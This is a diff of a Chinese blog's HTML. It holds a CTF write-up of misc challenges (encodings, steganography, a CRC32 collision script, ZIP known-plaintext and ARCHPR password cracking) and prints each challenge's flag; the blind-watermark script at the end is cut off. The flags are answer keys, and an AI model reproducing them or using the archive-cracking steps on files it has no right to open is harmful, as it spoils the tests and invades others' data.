-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201211311550.png" alt="image-20201201211311550"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201211311550.png" alt="image-20201201211311550" title="">
+                </div>
+                <div class="image-caption">image-20201201211311550</div>
+            </figure>
+
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">666c61677b7930755f616c72336164795f6b6e30775f7468335f4261736566616d316c797d</span><br></pre></td></tr></table></figure>
 
 <p>小写转大写，Base16</p>
 <p>666C61677B7930755F616C72336164795F6B6E30775F7468335F4261736566616D316C797D</p>
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128104036120.png" alt="image-20201128104036120"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128104036120.png" alt="image-20201128104036120" title="">
+                </div>
+                <div class="image-caption">image-20201128104036120</div>
+            </figure>
+
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;y0u_alr3ady_kn0w_th3_Basefam1ly&#125;</span><br></pre></td></tr></table></figure>
 
 
 
 
 
-<h4 id="SlientEye"><a href="#SlientEye" class="headerlink" title="SlientEye"></a>SlientEye</h4><p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128105301975.png" alt="image-20201128105301975"></p>
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128112731115.png" alt="image-20201128112731115"></p>
+<h4 id="SlientEye"><a href="#SlientEye" class="headerlink" title="SlientEye"></a>SlientEye</h4><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128105301975.png" alt="image-20201128105301975" title="">
+                </div>
+                <div class="image-caption">image-20201128105301975</div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128112731115.png" alt="image-20201128112731115" title="">
+                </div>
+                <div class="image-caption">image-20201128112731115</div>
+            </figure>
+
 <p><a target="_blank" rel="noopener" href="https://convertstring.com/zh_CN/EncodeDecode/HtmlDecode">HTML解码 - 在线HTML解码器 (convertstring.com)</a></p>
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128112815875.png" alt="image-20201128112815875"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128112815875.png" alt="image-20201128112815875" title="">
+                </div>
+                <div class="image-caption">image-20201128112815875</div>
+            </figure>
+
 <p>flag{n1_bu_j1ang_wu_d3}</p>
-<h4 id="编码之王"><a href="#编码之王" class="headerlink" title="编码之王"></a>编码之王</h4><p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128180130844.png" alt="image-20201128180130844"></p>
+<h4 id="编码之王"><a href="#编码之王" class="headerlink" title="编码之王"></a>编码之王</h4><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128180130844.png" alt="image-20201128180130844" title="">
+                </div>
+                <div class="image-caption">image-20201128180130844</div>
+            </figure>
+
 <p>社会主义核心价值观编码</p>
 <p><a target="_blank" rel="noopener" href="http://ctf.ssleye.com/cvencode.html">CTF在线工具-在线核心价值观编码|核心价值观编码算法|Core Values Encoder (ssleye.com)</a></p>
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128180242480.png" alt="image-20201128180242480"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128180242480.png" alt="image-20201128180242480" title="">
+                </div>
+                <div class="image-caption">image-20201128180242480</div>
+            </figure>
+
 <p>佛曰编码</p>
 <p><a target="_blank" rel="noopener" href="http://www.keyfc.net/bbs/tools/tudoucode.aspx">与佛论禅 (keyfc.net)</a></p>
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128180304253.png" alt="image-20201128180304253"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128180304253.png" alt="image-20201128180304253" title="">
+                </div>
+                <div class="image-caption">image-20201128180304253</div>
+            </figure>
+
 <p>新佛曰编码</p>
 <p><a target="_blank" rel="noopener" href="http://hi.pcmoe.net/buddha.html">新约佛论禅/佛曰加密 - PcMoe!</a></p>
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128180337119.png" alt="image-20201128180337119"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128180337119.png" alt="image-20201128180337119" title="">
+                </div>
+                <div class="image-caption">image-20201128180337119</div>
+            </figure>
+
 <p>Jsfuck编码</p>
 <p>浏览器控制台解码</p>
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128180449828.png" alt="image-20201128180449828"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128180449828.png" alt="image-20201128180449828" title="">
+                </div>
+                <div class="image-caption">image-20201128180449828</div>
+            </figure>
+
 <p>DMCTF{Wow_you_kn0w_more_eNcoding}</p>
 <h4 id="jpgsteg"><a href="#jpgsteg" class="headerlink" title="jpgsteg"></a>jpgsteg</h4><p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201212207906.png" alt="image-20201201212207906"></p>
 <p>这道题用了JPHS这个工具</p>
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201212404922.png" alt="image-20201201212404922"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201212404922.png" alt="image-20201201212404922" title="">
+                </div>
+                <div class="image-caption">image-20201201212404922</div>
+            </figure>
+
 <p>这里让我们输入密码，根据题目的提示，盲猜123456（虽然我是问大佬的。。。）</p>
 <p>分离出一个文本</p>
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201212719773.png" alt="image-20201201212719773"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201212719773.png" alt="image-20201201212719773" title="">
+                </div>
+                <div class="image-caption">image-20201201212719773</div>
+            </figure>
+
 <p>敲击码，对应图片名称Tap Code</p>
 <p>按照表解码</p>
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201212823509.png" alt="image-20201201212823509"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201212823509.png" alt="image-20201201212823509" title="">
+                </div>
+                <div class="image-caption">image-20201201212823509</div>
+            </figure>
+
 <p>flag{ohhamazing}</p>
 <h4 id="Collision"><a href="#Collision" class="headerlink" title="Collision"></a>Collision</h4><p>根据题目名字可以大致猜出用CRC32碰撞，然后上脚本跑就可以</p>
 <p>脚本如下</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#PYTHON2</span></span><br><span class="line"><span class="keyword">from</span> zlib <span class="keyword">import</span> crc32</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">char=<span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz_&#123;&#125;&#x27;</span></span><br><span class="line"><span class="comment"># char=&#x27;0123456789&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crc32_f</span>(<span class="params">data</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">hex</span>(crc32(data)&amp;<span class="number">0xffffffff</span>)[<span class="number">2</span>:<span class="number">10</span>]</span><br><span class="line"></span><br><span class="line">length=<span class="built_in">input</span>(<span class="string">&#x27;length:&#x27;</span>)</span><br><span class="line">crc32_=raw_input(<span class="string">&#x27;crc32:&#x27;</span>).lower()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    text=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        text+=char[random.randint(<span class="number">0</span>,<span class="built_in">len</span>(char)-<span class="number">1</span>)]</span><br><span class="line">    <span class="keyword">if</span> crc32_f(text)==crc32_:</span><br><span class="line">        raw_input(<span class="string">&#x27;find it:&#x27;</span>+text)</span><br><span class="line">        exit</span><br></pre></td></tr></table></figure>
 
 <p>CRC32用WinRAR查看</p>
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128181028337.png" alt="image-20201128181028337"></p>
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128181552152.png" alt="image-20201128181552152"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128181028337.png" alt="image-20201128181028337" title="">
+                </div>
+                <div class="image-caption">image-20201128181028337</div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128181552152.png" alt="image-20201128181552152" title="">
+                </div>
+                <div class="image-caption">image-20201128181552152</div>
+            </figure>
+
 <p>flag{crc32collis1on}</p>
 <h4 id="kaomoji"><a href="#kaomoji" class="headerlink" title="kaomoji"></a>kaomoji</h4><p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128182140609.png" alt="image-20201128182140609"></p>
 <p>flag.zip里面有个secret.txt，盲猜是明文</p>
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128182054222.png" alt="image-20201128182054222"></p>
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128183314882.png" alt="image-20201128183314882"></p>
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128185910688.png" alt="image-20201128185910688"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128182054222.png" alt="image-20201128182054222" title="">
+                </div>
+                <div class="image-caption">image-20201128182054222</div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128183314882.png" alt="image-20201128183314882" title="">
+                </div>
+                <div class="image-caption">image-20201128183314882</div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128185910688.png" alt="image-20201128185910688" title="">
+                </div>
+                <div class="image-caption">image-20201128185910688</div>
+            </figure>
+
 <p>浏览器控制台直接解密</p>
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128191119983.png" alt="image-20201128191119983"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128191119983.png" alt="image-20201128191119983" title="">
+                </div>
+                <div class="image-caption">image-20201128191119983</div>
+            </figure>
+
 <p>flag{kaomoj1_1s_cut3}</p>
-<h4 id="ARCHPR"><a href="#ARCHPR" class="headerlink" title="ARCHPR"></a>ARCHPR</h4><p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128191710927.png" alt="image-20201128191710927"></p>
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128191655160.png" alt="image-20201128191655160"></p>
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128191538682.png" alt="image-20201128191538682"></p>
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128191749702.png" alt="image-20201128191749702"></p>
+<h4 id="ARCHPR"><a href="#ARCHPR" class="headerlink" title="ARCHPR"></a>ARCHPR</h4><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128191710927.png" alt="image-20201128191710927" title="">
+                </div>
+                <div class="image-caption">image-20201128191710927</div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128191655160.png" alt="image-20201128191655160" title="">
+                </div>
+                <div class="image-caption">image-20201128191655160</div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128191538682.png" alt="image-20201128191538682" title="">
+                </div>
+                <div class="image-caption">image-20201128191538682</div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128191749702.png" alt="image-20201128191749702" title="">
+                </div>
+                <div class="image-caption">image-20201128191749702</div>
+            </figure>
+
 <p><a target="_blank" rel="noopener" href="http://ctf.ssleye.com/morse.html">CTF在线工具-在线莫尔斯电码编码|在线莫尔斯电码解码|莫尔斯电码算法|Morse (ssleye.com)</a></p>
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128192150442.png" alt="image-20201128192150442"></p>
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128192342062.png" alt="image-20201128192342062"></p>
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128192402961.png" alt="image-20201128192402961"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128192150442.png" alt="image-20201128192150442" title="">
+                </div>
+                <div class="image-caption">image-20201128192150442</div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128192342062.png" alt="image-20201128192342062" title="">
+                </div>
+                <div class="image-caption">image-20201128192342062</div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128192402961.png" alt="image-20201128192402961" title="">
+                </div>
+                <div class="image-caption">image-20201128192402961</div>
+            </figure>
+
 <p>flag{th1s_15_f1agggggg}</p>
-<h4 id="outguess"><a href="#outguess" class="headerlink" title="outguess"></a>outguess</h4><p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128192932243.png" alt="image-20201128192932243"></p>
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128192951386.png" alt="image-20201128192951386"></p>
+<h4 id="outguess"><a href="#outguess" class="headerlink" title="outguess"></a>outguess</h4><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128192932243.png" alt="image-20201128192932243" title="">
+                </div>
+                <div class="image-caption">image-20201128192932243</div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128192951386.png" alt="image-20201128192951386" title="">
+                </div>
+                <div class="image-caption">image-20201128192951386</div>
+            </figure>
+
 <p><a target="_blank" rel="noopener" href="https://planetcalc.com/1434/">Online calculator: Caesar cipher (planetcalc.com)</a></p>
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128193113033.png" alt="image-20201128193113033"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128193113033.png" alt="image-20201128193113033" title="">
+                </div>
+                <div class="image-caption">image-20201128193113033</div>
+            </figure>
+
 <p><a target="_blank" rel="noopener" href="https://www.sojson.com/encrypt_aes.html">在线AES加密 | AES解密 - 在线工具 (sojson.com)</a></p>
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128193235290.png" alt="image-20201128193235290"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128193235290.png" alt="image-20201128193235290" title="">
+                </div>
+                <div class="image-caption">image-20201128193235290</div>
+            </figure>
+
 <p>flag{y0u_ar3_awes0m3}</p>
-<h4 id="Whitespace"><a href="#Whitespace" class="headerlink" title="Whitespace"></a>Whitespace</h4><p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201213113170.png" alt="image-20201201213113170"></p>
+<h4 id="Whitespace"><a href="#Whitespace" class="headerlink" title="Whitespace"></a>Whitespace</h4><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201213113170.png" alt="image-20201201213113170" title="">
+                </div>
+                <div class="image-caption">image-20201201213113170</div>
+            </figure>
+
 <p>下载下来的压缩包需要密码，在注释里面，Whitespace</p>
 <p><a target="_blank" rel="noopener" href="https://vii5ard.github.io/whitespace/">Whitelips the Whitespace IDE (vii5ard.github.io)</a></p>
 <p>在线IDE，运行程序</p>
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201213335829.png" alt="image-20201201213335829"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201213335829.png" alt="image-20201201213335829" title="">
+                </div>
+                <div class="image-caption">image-20201201213335829</div>
+            </figure>
+
 <p>解压出来是两张图片和一个hint.txt</p>
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201213521455.png" alt="image-20201201213521455"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201213521455.png" alt="image-20201201213521455" title="">
+                </div>
+                <div class="image-caption">image-20201201213521455</div>
+            </figure>
+
 <p>盲水印</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">cmd = <span class="literal">None</span></span><br><span class="line">debug = <span class="literal">False</span></span><br><span class="line">seed = <span class="number">20160930</span></span><br><span class="line">oldseed = <span class="literal">False</span></span><br><span class="line">alpha = <span class="number">3.0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;-h&#x27;</span> <span class="keyword">in</span> sys.argv <span class="keyword">or</span> <span class="string">&#x27;--help&#x27;</span> <span class="keyword">in</span> sys.argv <span class="keyword">or</span> <span class="built_in">len</span>(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;Usage: python bwm.py &lt;cmd&gt; [arg...] [opts...]&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;  cmds:&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;    encode &lt;image&gt; &lt;watermark&gt; &lt;image(encoded)&gt;&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;           image + watermark -&gt; image(encoded)&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;    decode &lt;image&gt; &lt;image(encoded)&gt; &lt;watermark&gt;&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;           image + image(encoded) -&gt; watermark&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;  opts:&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;    --debug,          Show debug&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;    --seed &lt;int&gt;,     Manual setting random seed (default is 20160930)&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;    --oldseed         Use python2 random algorithm.&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;    --alpha &lt;float&gt;,  Manual setting alpha (default is 3.0)&#x27;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    cmd = sys.argv[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> cmd != <span class="string">&#x27;encode&#x27;</span> <span class="keyword">and</span> cmd != <span class="string">&#x27;decode&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;Wrong cmd %s&#x27;</span> % cmd)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;--debug&#x27;</span> <span class="keyword">in</span> sys.argv:</span><br><span class="line">        debug = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">del</span> sys.argv[sys.argv.index(<span class="string">&#x27;--debug&#x27;</span>)]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;--seed&#x27;</span> <span class="keyword">in</span> sys.argv:</span><br><span class="line">        p = sys.argv.index(<span class="string">&#x27;--seed&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt;= p+<span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&#x27;Missing &lt;int&gt; for --seed&#x27;</span>)</span><br><span class="line">            sys.exit(<span class="number">1</span>)</span><br><span class="line">        seed = <span class="built_in">int</span>(sys.argv[p+<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">del</span> sys.argv[p+<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">del</span> sys.argv[p]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;--oldseed&#x27;</span> <span class="keyword">in</span> sys.argv:</span><br><span class="line">        oldseed = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">del</span> sys.argv[sys.argv.index(<span class="string">&#x27;--oldseed&#x27;</span>)]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;--alpha&#x27;</span> <span class="keyword">in</span> sys.argv:</span><br><span class="line">        p = sys.argv.index(<span class="string">&#x27;--alpha&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt;= p+<span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&#x27;Missing 